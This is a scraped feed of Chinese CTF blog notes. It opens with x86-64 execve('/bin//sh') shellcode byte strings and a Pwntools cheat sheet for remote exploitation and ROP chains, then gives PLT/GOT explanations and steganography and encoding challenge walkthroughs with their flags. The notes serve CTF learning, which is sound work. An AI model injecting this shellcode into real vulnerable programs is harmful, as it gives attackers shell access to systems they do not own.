b'H1\xd2RH\x89\xe6H\xb8/bin//shPH\x89\xe7H\xc7\xc0;\x00\x00\x00\x0f\x05'</span></code></pre><blockquote><p><strong>这样生成的 shellcode 就只有 0x1E，一般这种大小就足够了</strong></p></blockquote><hr><h3 id="其他可用的-shellcode"><a href="#其他可用的-shellcode" class="headerlink" title="其他可用的 shellcode"></a>其他可用的 shellcode</h3><blockquote><p>以下两种 shellcode 长度都是 0x1E，共 30 个字节</p><p>此外，可以在此网站查阅更多版本的 shellcode：<br><a href="http://shell-storm.org/shellcode/index.html">Shellcodes database for study cases (shell-storm.org)</a></p></blockquote><pre class="language-python" data-language="python"><code class="language-python">shellcode <span class="token operator">=</span> <span class="token string">b'\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05'</span>shellcode <span class="token operator">=</span> <span class="token string">b'\x48\x31\xC0\x6A\x3B\x58\x48\x31\xFF\x48\xBF\x2F\x62\x69\x6E\x2F\x73\x68\x00\x57\x54\x5F\x48\x31\xF6\x48\x31\xD2\x0F\x05'</span></code></pre><hr><h2 id="Pwntools-语句"><a href="#Pwntools-语句" class="headerlink" title="Pwntools 语句"></a>Pwntools 语句</h2><h3 id="连接程序和端口"><a href="#连接程序和端口" class="headerlink" title="连接程序和端口"></a>连接程序和端口</h3><table><thead><tr><th>语句</th><th>意义</th></tr></thead><tbody><tr><td>io &#x3D; porcess(“.&#x2F;&lt;文件名&gt;”)</td><td>本地连接</td></tr><tr><td>io &#x3D; remote(“ip地址”, 端口)</td><td>远程连接</td></tr><tr><td>io.close()</td><td>关闭连接</td></tr></tbody></table><hr><h3 id="发送-payload"><a href="#发送-payload" class="headerlink" title="发送 payload"></a>发送 payload</h3><table><thead><tr><th>语句</th><th>意义</th></tr></thead><tbody><tr><td>io.sendafter(some_string, payload)</td><td>接收到 some_string 后，发送你的 payload</td></tr><tr><td>io.sendlineafter(some_string, payload)</td><td>接收到 some_string 后，发送你的 payload，并进行换行（末尾\n）</td></tr><tr><td>io.send(payload)</td><td>发送 payload</td></tr><tr><td>io.sendline(payload)</td><td>发送 payload，并进行换行（末尾\n）</td></tr></tbody></table><hr><h3 id="接收返回内容"><a href="#接收返回内容" class="headerlink" title="接收返回内容"></a>接收返回内容</h3><table><thead><tr><th>语句</th><th>意义</th></tr></thead><tbody><tr><td>io.interactive()</td><td>直接进行交互，相当于回到 shell 的模式，一般在取得 shell 之后使用</td></tr></tbody></table><table><thead><tr><th>语句</th><th>意义</th></tr></thead><tbody><tr><td>asm(shellcraft.sh())</td><td>生成 Pwntools 默认 shellcode</td></tr><tr><td>shellcode &#x3D; asm(shellcode)</td><td>生成自己编写的 shellcode</td></tr></tbody></table><table><thead><tr><th>语句</th><th>意义</th></tr></thead><tbody><tr><td>io.recv(N)</td><td>接收 N 个字符</td></tr><tr><td>io.recvline()</td><td>接收一行输出</td></tr><tr><td>io.recvlines(N)</td><td>接收 N 个行输出</td></tr><tr><td>io.recvuntil(some_string)</td><td>接收到 some_string 为止</td></tr></tbody></table><table><thead><tr><th>语句</th><th>意义</th></tr></thead><tbody><tr><td>stack&#x3D;int(io.recv(10),16)</td><td>接收回显的参数在栈上的地址，长度是10，以16进制表示</td></tr></tbody></table><hr><h3 id="ELF-文件操作"><a href="#ELF-文件操作" class="headerlink" title="ELF 文件操作"></a>ELF 文件操作</h3><blockquote><p><strong>首先需要 <code>elf = ELF(&quot;./&lt;文件名&gt;&quot;)</code> 来产生一个对象</strong></p></blockquote><table><thead><tr><th>语句</th><th>意义</th></tr></thead><tbody><tr><td>elf.symbols[“a_function”]</td><td>找到 a_function 的地址</td></tr><tr><td>elf.got[“a_function”]</td><td>找到 a_function 的 got</td></tr><tr><td>elf.plt[“a_function”]</td><td>找到 a_function 的 plt</td></tr><tr><td>next(elf.search(“some_characters”))</td><td>找到包含 some_characters 的内容，可以是字符串、汇编代码或某个数值的地址</td></tr></tbody></table><hr><h3 id="ROP-链"><a href="#ROP-链" class="headerlink" title="ROP 链"></a>ROP 链</h3><blockquote><p><strong>首先需要 <code>rop = ROP(&quot;./&lt;文件名&gt;&quot;)</code> 创建一个对象</strong></p></blockquote><table><thead><tr><th>语句</th><th>意义</th></tr></thead><tbody><tr><td>rop.raw(‘a’ * 32)</td><td>在构造的 rop 链里面写32个 a</td></tr><tr><td>rop.call(‘read’ , (0 , elf.bss(0x80)))</td><td>调用一个函数，可以简写成：<code>rop.read(0,elf.bss(0x80))</code></td></tr><tr><td>rop.chain()</td><td>就是整个 rop 链，发送的 payload</td></tr><tr><td>rop.dump()</td><td>直观地展示当前的 rop 链</td></tr><tr><td>rop.migrate(base_stage)</td><td>将程序流程转移到 base_stage（地址）</td></tr><tr><td>rop.unresolve(value)</td><td>给出一个地址，反解析出符号</td></tr><tr><td>rop.search(regs&#x3D;[‘ecx’ , ‘ebx’])</td><td>搜索对 eax 进行操作的 gadgets</td></tr><tr><td>rop.find_gadget([‘pop eax’ , ‘ret’])</td><td>搜索 <code>pop eax ret</code> 这样的 gadgets</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> 二进制漏洞利用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF笔记 </tag>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PLT表和GOT表</title>
      <link href="/2023/0329133b28.html"/>
      <url>/2023/0329133b28.html</url>
      
        <content type="html"><![CDATA[<h2 id="PLT-表和-GOT-表"><a href="#PLT-表和-GOT-表" class="headerlink" title="PLT 表和 GOT 表"></a>PLT 表和 GOT 表</h2><blockquote><p>为了更好的用户体验和内存、CPU 的利用率，程序编译时会采用两种表进行辅助，一个为 PLT 表，一个为 GOT 表</p><p><code>PLT表</code> 称为 <mark>内部函数表</mark>，<code>GOT表</code> 称为 <mark>全局函数表</mark>（动态函数表）</p></blockquote><ul><li>这两个表是相对应的，PLT 表中的数据就是 GOT 表中的一个地址：<br><img src="https://s2.loli.net/2023/03/17/8sbdGo4LcXJAh7r.png" alt="CTF - Pwn_PLT表 &amp; GOT表1.png"></li></ul><blockquote><p>PLT 表其实是一个过渡的作用，<mark>PLT 表中只存放 GOT 表项的地址</mark>，而不是函数真实的地址，<mark>函数真实的地址存放在 GOT 表中</mark></p></blockquote><hr><h2 id="地址的调用流程"><a href="#地址的调用流程" class="headerlink" title="地址的调用流程"></a>地址的调用流程</h2><blockquote><p>以 <code>scanf()</code> 函数为例，当 <code>main()</code> 函数开始，会请求 PLT 表中这个函数对应的 GOT 表地址</p></blockquote><ul><li><strong>若是第一次调用</strong><ol><li>由函数调用跳入到 PLT 表中</li><li>PLT 表跳到 GOT 表中</li><li>由 GOT 表回跳到 PLT 表中，这时候进行压栈，把代表函数的 ID 压栈</li><li>接着跳转到公共的 PLT表 项中</li><li>进入到 GOT 表</li><li>然后 <code>_dl_runtime_resolve</code> 对动态函数进行地址解析和重定位</li><li>把动态函数真实的地址写入到 GOT 表项中，然后执行函数并返回</li></ol></li><li><strong>若是第二次调用</strong><ol><li>由函数调用跳入到 PLT 表中</li><li>PLT表 跳入到 GOT 表中，由于这个时候该表项已经是动态函数的真实地址了，所以可以直接执行然后返回，例如：<code>call scanf() —&gt; scanf() 的 PLT 表 —&gt;scanf() 的 GOT 表</code></li><li>当进入带有 @plt 标志的函数时，由函数调用跳入到 PLT 表中</li><li>在 PLT 表中找到对应的函数的 GOT 表项地址</li><li>通过 jmp 指令跳转到 GOT 表，得到函数的真实地址</li><li>跳转到真实函数地址执行</li></ol></li></ul><p><img src="https://s2.loli.net/2023/03/17/SXbfnRoJVKGpej2.png" alt="CTF - Pwn_PLT表 &amp; GOT表2.png"></p><hr><h2 id="IDA-中的体现"><a href="#IDA-中的体现" class="headerlink" title="IDA 中的体现"></a>IDA 中的体现</h2><h3 id="汇编代码"><a href="#汇编代码" class="headerlink" title="汇编代码"></a>汇编代码</h3><p><img src="https://s2.loli.net/2023/03/17/BpfS9JQukl6qrzd.png" alt="CTF - Pwn_PLT表 &amp; GOT表3.png"></p><blockquote><p><code>call _printf</code> 并不是跳转到了实际的 <code>_printf</code> 函数的位置。 因为在编译时程序并不能确定 <code>printf</code> 函数的地址， 所以这个 <code>call</code> 指令实际上是通过相对跳转， 跳转到了 PLT表 中的 <code>_printf</code> 项，然后再根据 PLT表 中的地址跳转到 GOT表，才能获取到实际的 <code>_printf</code> 函数地址，进而执行 <code>printf</code> 函数</p></blockquote><h3 id="程序段"><a href="#程序段" class="headerlink" title="程序段"></a>程序段</h3><table><thead><tr><th align="left">段名</th><th align="left">作用</th></tr></thead><tbody><tr><td align="left">.got</td><td align="left">GOT 全局偏移表。这是「链接器」为「外部符号」填充的实际偏移表</td></tr><tr><td align="left">.plt</td><td align="left">PLT 程序链接表。它有两个功能，要么在 <code>.got.plt</code> 节中拿到地址，并跳转。要么当 <code>.got.plt</code> 没有所需地址的时，触发「链接器」去找到所需地址</td></tr><tr><td align="left">.got.plt</td><td align="left">这个是 GOT 专门为 PLT 准备的。也就是说 <mark>.got.plt 中的值是 GOT 的一部分</mark>。它包含上述 PLT 表所需地址（已经找到的和需要去触发的）</td></tr><tr><td align="left">.plt.got</td><td align="left"></td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> 二进制漏洞利用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF笔记 </tag>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CatCTF-CatCatCat</title>
      <link href="/2023/032b87caa3.html"/>
      <url>/2023/032b87caa3.html</url>
      
        <content type="html"><![CDATA[<h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><ul><li><p><mark>在 kali 中分析图像的隐藏内容</mark></p></li><li><p>熟悉 <mark>Rabbit加解密</mark>、<mark>Base91加解密</mark>、<mark>Ook!语言加解密</mark> 的特点<br>  <a href="http://www.esjson.com/rabbitEncrypt.html">Rabbit加解密(ES JSON在线工具)</a><br>  <a href="http://www.hiencode.com/base91.html">CTF在线工具-在线base91编码</a><br>  <a href="https://www.splitbrain.org/services/ook">Brainfuck&#x2F;Ook! Encoding</a></p></li></ul><hr><p><a href="https://adworld.xctf.org.cn/challenges/details?hash=e395fd1e-8d98-11ed-ab28-000c29bc20bf&task_category_id=1">CatCTF-CatCatCat</a></p><hr><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ol><li><p>下载文件得到一张 .jpg 图和一个 .txt 文本文件<br><img src="https://s2.loli.net/2023/03/18/ILuT6bKXlp1qcZS.png" alt="CatCTF-CatCatCat1.png"></p></li><li><p>图片最底下挡住了一块，在 kali 下查看是否有隐藏内容<br><img src="https://s2.loli.net/2023/03/18/LGODz8qQRc1oVJe.png" alt="CatCTF-CatCatCat2.png"><br><img src="https://s2.loli.net/2023/03/18/PsauivrSOloXVqw.png" alt="CatCTF-CatCatCat3.png"><br>具体查看 flag 字符串：<br><img src="https://s2.loli.net/2023/03/18/skACVwB7XxaIJ8j.png" alt="CatCTF-CatCatCat4.png"><br>在文件中发现字符串：<code>passwordis..catflag..]</code></p></li><li><p>根据文本内容，发现很多 <code>&#39;+&#39;</code>，并且开头为：<code>U2FsdGVkX1</code><br><img src="https://s2.loli.net/2023/03/18/BMSQklAGwFo1X93.png" alt="CatCTF-CatCatCat5.png"><br>这是 <em><strong>Rabbit 加密</strong></em> 的特点，并且 Rabbit 加解密会使用到密钥，猜测密钥就是 <code>catflag</code></p></li><li><p><a href="http://www.esjson.com/rabbitEncrypt.html">Rabbit加解密(ES JSON在线工具)</a><br><img src="https://s2.loli.net/2023/03/18/lAP1hEvpdqKJ96Y.png" alt="CatCTF-CatCatCat6.png"></p></li><li><p>将结果进行 Base91 解密：<a href="http://www.hiencode.com/base91.html">CTF在线工具-在线base91编码</a><br><img src="https://s2.loli.net/2023/03/18/Bnwfz2YpKZWkgmX.png" alt="CatCTF-CatCatCat7.png"></p></li><li><p>发现结果中存在很多 <code>&#39;.&#39;</code>、<code>&#39;!&#39;</code>、<code>&#39;?&#39;</code>，这是 <em><strong>Ook 语言加密</strong></em> 的特点：<a href="https://www.splitbrain.org/services/ook">Brainfuck&#x2F;Ook! Encoding</a><br><img src="https://s2.loli.net/2023/03/18/iWKpgqOxQVn4cY9.png" alt="CatCTF-CatCatCat8.png"></p></li><li><p>得到 flag：CATCTF{Th1s_V3ry_cute_catcat!!!}</p></li></ol><hr><h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><blockquote><p>CATCTF{Th1s_V3ry_cute_catcat!!!}</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 杂项 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MISC </tag>
            
            <tag> CTF刷题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CatCTF-CatchCat</title>
      <link href="/2023/036b7870b8.html"/>
      <url>/2023/036b7870b8.html</url>
      
        <content type="html"><![CDATA[<h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><ul><li><mark>根据地图 GPS 数据复现轨迹</mark><ol><li>利用 NMEA 转 KML 可视化还原 GPS 轨迹（<a href="https://www.h-schmidt.net/NMEA/">NMEA 转 KML</a>）</li><li>将 KML 数据可视化为 GPS 轨迹（<a href="https://mygeodata.cloud/converter/">KML 可视化轨迹</a>）</li></ol></li><li><mark>GPS 数据格式</mark>：<a href="https://www.lehoon.cn/orther/2017/04/25/gnss-gpgga-formet.html">GPGGA格式详解 | 豌豆荚博客 (lehoon.cn)</a></li></ul><hr><p><a href="https://adworld.xctf.org.cn/challenges/details?hash=36f991a4-8d9a-11ed-b5da-000c296d9df6&task_category_id=1">CatCTF-CatchCat</a></p><hr><h2 id="思路一"><a href="#思路一" class="headerlink" title="思路一"></a>思路一</h2><ol><li><p>下载文件，是一个 .txt 文本，根据题目提示，以及文本数据的特点，给出的应该是 GPS 数据<br><img src="https://s2.loli.net/2023/03/18/RXxOASdcCkb1Pta.png" alt="CatCTF-CatchCat1.png"></p></li><li><p><a href="https://www.lehoon.cn/orther/2017/04/25/gnss-gpgga-formet.html">GPGGA格式详解 | 豌豆荚博客 (lehoon.cn)</a><br>了解得知，该文本内容是 GPS 的 NMEA 格式轨迹数据，将数据还原为轨迹即可</p></li><li><p>利用 NMEA 转 KML 可视化还原 GPS 轨迹：<a href="https://www.h-schmidt.net/NMEA/">NMEA 转 KML</a><br><img src="https://s2.loli.net/2023/03/18/1WbFYwi3KNPnLpT.png" alt="CatCTF-CatchCat2.png"></p></li><li><p>将 KML 数据可视化为 GPS 轨迹：<a href="https://mygeodata.cloud/converter/">KML 可视化轨迹</a><br><img src="https://s2.loli.net/2023/03/18/3W5ehdYQVjKl4NB.png" alt="CatCTF-CatchCat3.png"></p></li><li><p>根据轨迹可得 flag：CatCTF{GPS_M1ao}</p></li></ol><hr><h2 id="思路二"><a href="#思路二" class="headerlink" title="思路二"></a>思路二</h2><ol><li><p>通过写脚本提取数据还原 GPS 轨迹</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> pltdata <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'CatchCat.txt'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span>x <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>y <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> line <span class="token keyword">in</span> data<span class="token punctuation">:</span>  <span class="token keyword">if</span> line<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>d1<span class="token punctuation">,</span> d2 <span class="token operator">=</span> <span class="token builtin">float</span><span class="token punctuation">(</span>line<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">:</span><span class="token number">30</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">float</span><span class="token punctuation">(</span>line<span class="token punctuation">[</span><span class="token number">33</span><span class="token punctuation">:</span><span class="token number">47</span><span class="token punctuation">]</span><span class="token punctuation">)</span>x<span class="token punctuation">.</span>append<span class="token punctuation">(</span>d1<span class="token punctuation">)</span>y<span class="token punctuation">.</span>append<span class="token punctuation">(</span>d2<span class="token punctuation">)</span>plt<span class="token punctuation">.</span>scatter<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre></li><li><p>获得轨迹：<br><img src="https://s2.loli.net/2023/03/18/y1HFtlVX5DLvEcG.png" alt="CatCTF-CatchCat4.png"></p></li></ol><hr><h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><blockquote><p>CatCTF{GPS_M1ao}</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 杂项 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MISC </tag>
            
            <tag> CTF刷题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CatCTF-miao~</title>
      <link href="/2023/03c30bda11.html"/>
      <url>/2023/03c30bda11.html</url>
      
        <content type="html"><![CDATA[<h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><ul><li><p>熟悉<mark>图像隐写</mark>、<mark>音频隐写</mark>，学会使用 <mark>Audacity 和 DeepSound</mark></p></li><li><p>了解<mark>兽语解密</mark></p></li><li><p><mark>不要太相信 binwalk 的隐藏文件检测结果</mark>，有时候不准确，先用 foremost 尝试分离</p></li></ul><hr><p><a href="https://adworld.xctf.org.cn/media/file/task/01ba54b9-5a1c-40f3-8fb5-19f1abf9f97a.zip">CatCTF-miao~</a></p><hr><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ol><li><p>解压得到一张 jpg 图片<br><img src="https://s2.loli.net/2023/03/18/1q762AysHlObeEr.png" alt="CatCTF-miao~1.png"></p></li><li><p>在 Ubuntu 下查看图片隐藏信息，查看字符串未发现有用信息：<br><img src="https://s2.loli.net/2023/03/18/Do4UwW5MHX7FxO8.png" alt="CatCTF-miao~2.png"><img src="https://s2.loli.net/2023/03/18/yOcNjw3ZVfxQA5g.png" alt="CatCTF-miao~3.png"></p></li><li><p>用 <code>binwalk</code> 检测是否含有隐藏文件：<br><img src="https://s2.loli.net/2023/03/18/tjohl2OM4UJ8R7v.png" alt="CatCTF-miao~4.png"><br><em>这里踩坑了。。。不要太相信 binwalk 的分析结果，这里显示没有其他隐藏文件，但其实是有的</em></p></li><li><p>在 Winhex 下可以看到包含了 wav：<br><img src="https://s2.loli.net/2023/03/18/tJn1vUyOfFjiGQV.png" alt="CatCTF-miao~5.png"></p></li><li><p>用 <code>foremost</code> 分离，得到几个文件夹：<br><img src="https://s2.loli.net/2023/03/18/F3NKLsiya61PAXC.png" alt="CatCTF-miao~6.png"><br><img src="https://s2.loli.net/2023/03/18/PGhaDIp3OTvRrBW.png" alt="CatCTF-miao~7.png"><br>其中，jpg 文件夹内时一张原图，wav 文件夹内有一段音频：<br><img src="https://s2.loli.net/2023/03/18/nwdCN526HjYTFfa.png" alt="CatCTF-miao~8.png"><br>用 <code>Audacity</code> 打开，并查看频谱图：<br><img src="https://s2.loli.net/2023/03/18/6FkpbNXG3LtCcJH.png" alt="CatCTF-miao~9.png"><br><img src="https://s2.loli.net/2023/03/19/DyTFkPxpGQn1t7K.png" alt="CatCTF-miao~10.png"><br>发现 <code>&quot;CatCTF&quot;</code> 字样</p></li><li><p>由于只给了一段猫叫的音频，猜测可能跟音频内容有关，可能是<strong>音频的解密密码</strong><br>利用音频隐写工具 <code>DeepSound</code> 打开：<br><img src="https://s2.loli.net/2023/03/18/8UGLHAmSbFX6NDy.png" alt="CatCTF-miao~11.png"><br>但是发现需要密码，尝试了文件名，不对，最后用音频的频谱图内发现的 CatCTF 作为密码成功<br><img src="https://s2.loli.net/2023/03/18/2bZSiLOdM4Hn1F8.png" alt="CatCTF-miao~12.png"><br>得到一个 flag.txt 文件，打开发现是猫叫声：<br><img src="https://s2.loli.net/2023/03/18/UqB7lIAP8w2vzog.png" alt="CatCTF-miao~13.png"></p></li><li><p>利用<mark>兽语解密</mark>：<a href="http://hi.pcmoe.net/roar.html">兽音译者&#x2F;兽语加密 - PcMoe!</a><br><img src="https://s2.loli.net/2023/03/18/Hi3nzBD4TsUlbfJ.png" alt="CatCTF-miao~14.png"><br>得到 flag</p></li></ol><hr><h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><blockquote><p>CatCTF{d0_y0u_Hate_c4t_ba3k1ng_?_M1ao~}</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 杂项 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MISC </tag>
            
            <tag> CTF刷题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界-Banmabanma</title>
      <link href="/2023/038fac3835.html"/>
      <url>/2023/038fac3835.html</url>
      
        <content type="html"><![CDATA[<h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><ul><li>要对<mark>条形码</mark>、<mark>二维码</mark>等敏感：<a href="https://online-barcode-reader.inliteresearch.com/">图形码在线阅读</a></li></ul><hr><p><a href="https://adworld.xctf.org.cn/media/file/task/f018351ca6c64ceb8a98c9da9f29c9cd.rar">攻防世界-Banmabanma</a></p><hr><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ol><li><p>解压后得到一个 .png 文件<br><img src="https://s2.loli.net/2023/03/18/tIJaUoHwGqb94vc.png" alt="攻防世界-Banmabanma1.png"></p></li><li><p>用 exeinfo PE 查看文件，确实是 png 图片，文件类型没有做修改<br>用 010editor 查看二进制内容，没有搜索到与 flag 有关的字符串<br>在 kali 中分析图片隐写内容无果，发现没有隐藏内容</p></li><li><p>发现图中斑马身上的黑色竖条纹，有点像条形码<br>利用条形码在线阅读：<a href="https://online-barcode-reader.inliteresearch.com/">图形码在线阅读</a><br><img src="https://s2.loli.net/2023/03/18/sy6HFwqhDc8Z2Uf.png" alt="攻防世界-Banmabanma2.png"><br>识别成功：<br><img src="https://s2.loli.net/2023/03/18/FI63pfeEViGDUXS.png" alt="攻防世界-Banmabanma3.png"><br>得到 flag</p></li></ol><hr><h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><blockquote><p>flag{TENSHINE}</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 杂项 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MISC </tag>
            
            <tag> CTF刷题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界-hit-the-core</title>
      <link href="/2023/03b348f395.html"/>
      <url>/2023/03b348f395.html</url>
      
        <content type="html"><![CDATA[<h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><ul><li><mark>给出形式很像 flag 的字符串时，注意观察大写、小写、数字、符号之间有没有什么规律</mark></li></ul><hr><p><a href="https://adworld.xctf.org.cn/media/file/task/8deb5f0c2cd84143807b6175f58d6f3f.core">攻防世界-hit-the-core</a></p><hr><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ol><li><p>下载得到一个 .core 文件，但用 exeinfo PE 查看发现是 64位 elf 可执行文件：<br><img src="https://s2.loli.net/2023/03/18/1CEFVKyqmactr5u.png" alt="攻防世界-hit-the-core1.png"></p></li><li><p>在 ubuntu 下执行失败：<br><img src="https://s2.loli.net/2023/03/18/YAVrLlPgGIZdC8q.png" alt="攻防世界-hit-the-core2.png"></p></li><li><p>在 IDA 中查看发现一串字符：<br><img src="https://s2.loli.net/2023/03/18/hGv4ODRmfVQtPUZ.png" alt="攻防世界-hit-the-core3.png"><br>格式很像 flag，但尝试后发现不对：</p><pre class="language-txt" data-language="txt"><code class="language-txt">cvqAeqacLtqazEigwiXobxrCrtuiTzahfFreqc&#123;bnjrKwgk83kgd43j85ePgb_e_rwqr7fvbmHjklo3tews_hmkogooyf0vbnk0ii87Drfgh_n kiwutfb0ghk9ro987k5tfb_hjiouo087ptfcv&#125;</code></pre></li><li><p><em><strong>发现这段 flag 很有规律，如果每 5 位看成一组，在每组的第 4 位就有一个大写字母，而其他的都是小写</strong></em><br><em><strong>尝试将每 5 组的第 4 位提取出来</strong></em>：</p><pre class="language-txt" data-language="txt"><code class="language-txt">ALEXCTF&#123;K33P_7H3_g00D_w0rk_up&#125;</code></pre></li><li><p>尝试后发现获得 flag</p></li></ol><hr><h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><blockquote><p>ALEXCTF{K33P_7H3_g00D_w0rk_up}</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 杂项 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MISC </tag>
            
            <tag> CTF刷题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界-misc_pic_again</title>
      <link href="/2023/034c132017.html"/>
      <url>/2023/034c132017.html</url>
      
        <content type="html"><![CDATA[<h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><ul><li><p><mark>熟悉 LSB 隐写</mark>，<mark>熟悉 zsteg 的相关分析结果的意思以及提取指令</mark></p></li><li><p><mark>熟悉 Stegsolve 的使用</mark></p></li></ul><hr><p><a href="https://adworld.xctf.org.cn/media/file/task/719af25af2ca4707972c6ae57060238e.png">攻防世界-misc_pic_again</a></p><hr><h2 id="思路一"><a href="#思路一" class="headerlink" title="思路一"></a>思路一</h2><ol><li><p>解压得到一张图片，图片没有异常：<br><img src="https://s2.loli.net/2023/03/18/2hcXLCq6la3mBIY.png" alt="攻防世界-misc_pic_again1.png"></p></li><li><p>在 kali 下用 <code>zsteg</code> 分析图片：<br><img src="https://s2.loli.net/2023/03/18/W4dLpPA5bwM3Vse.png" alt="攻防世界-misc_pic_again2.png"><br>发现分析结果中藏有 Zip 文件</p></li><li><p>提取 Zip 文件：<br><img src="https://s2.loli.net/2023/03/18/X1vF9GYIAnUWriO.png" alt="攻防世界-misc_pic_again3.png"><br>解压 1.zip 后得到一个可执行文件 1<br><img src="https://s2.loli.net/2023/03/18/34vqmy8SgXAG1tJ.png" alt="攻防世界-misc_pic_again4.png"><br>增加执行权限 <code>chmod a+x 1</code> 后，执行该文件，错误：<br><img src="https://s2.loli.net/2023/03/18/wqntTivXIoEF6OA.png" alt="攻防世界-misc_pic_again5.png"></p></li><li><p>查看文件 1 的字符串：<br><img src="https://s2.loli.net/2023/03/18/mWJuc7Nw4epb5Xt.png" alt="攻防世界-misc_pic_again6.png"><br>得到 flag</p></li></ol><hr><h2 id="思路二"><a href="#思路二" class="headerlink" title="思路二"></a>思路二</h2><ol><li><p>利用 Stegsolve 打开：<code>java -jar Stegsolve.jar</code><br><img src="https://s2.loli.net/2023/03/18/zYoseVpL3NnyHxE.png" alt="攻防世界-misc_pic_again7.png"></p></li><li><p>用 LSB 分析：<br><img src="https://s2.loli.net/2023/03/18/qOtIYPnJ8jLZNgE.png" alt="攻防世界-misc_pic_again8.png"><br>输入参数：<br><img src="https://s2.loli.net/2023/03/18/RYoa8OA21zEr9bq.png" alt="攻防世界-misc_pic_again9.png"><br>根据十六进制数据发现 <code>PK</code>，该文件是一个 <code>zip</code> 压缩包，直接将文件另存为 1.zip：<br><img src="https://s2.loli.net/2023/03/18/LGauWoRdxEYXeJ3.png" alt="攻防世界-misc_pic_again10.png"><br>解压后得到一个 elf 可执行文件：<br><img src="https://s2.loli.net/2023/03/18/gTJwGmp8sHei3rz.png" alt="攻防世界-misc_pic_again11.png"></p></li><li><p>后续同思路一，在 linux 下 <code>strings 1</code> 得到 flag</p></li></ol><hr><h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><blockquote><p>hctf{scxdc3tok3yb0ard4g41n~~~}</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 杂项 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MISC </tag>
            
            <tag> CTF刷题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界-适合作为桌面</title>
      <link href="/2023/0341c93d47.html"/>
      <url>/2023/0341c93d47.html</url>
      
        <content type="html"><![CDATA[<h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><ul><li><p><mark>得到文件的十六进制数据时，可以将该十六进制数据粘贴进 WinHex 后另存为一个新的文件</mark>，就可以得到该十六进制数据对应的文件，注意文件后缀名</p></li><li><p><mark>留意 pyc、pyt 等，一般与 python 反编译有关</mark></p></li></ul><hr><p><a href="https://adworld.xctf.org.cn/media/file/task/1573d940d9bb47a083da6db70ffbffe0.rar">攻防世界-适合作为桌面</a></p><hr><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ol><li><p>解压得到一张 png 图片<br><img src="https://s2.loli.net/2023/03/18/t5WziZMApqyuN2f.png" alt="攻防世界-适合作为桌面1.png"></p></li><li><p>用 <code>Stegsolve</code> 打开：<code>java -jar Stegsolve.jar</code><br>通过调整颜色发现一个二维码<br><img src="https://s2.loli.net/2023/03/18/vY8iyJEbFklUc1A.png" alt="攻防世界-适合作为桌面2.png"><br>扫码得到一串字符：</p><pre class="language-txt" data-language="txt"><code class="language-txtcode></pre></li><li><p>发现该字符都是由数字和字母 ABCDEF 组成的，由此猜测这是十六进制<br>进行十六进制转字符串：<br><img src="https://s2.loli.net/2023/03/18/48nwcoFpOVlfdzD.png" 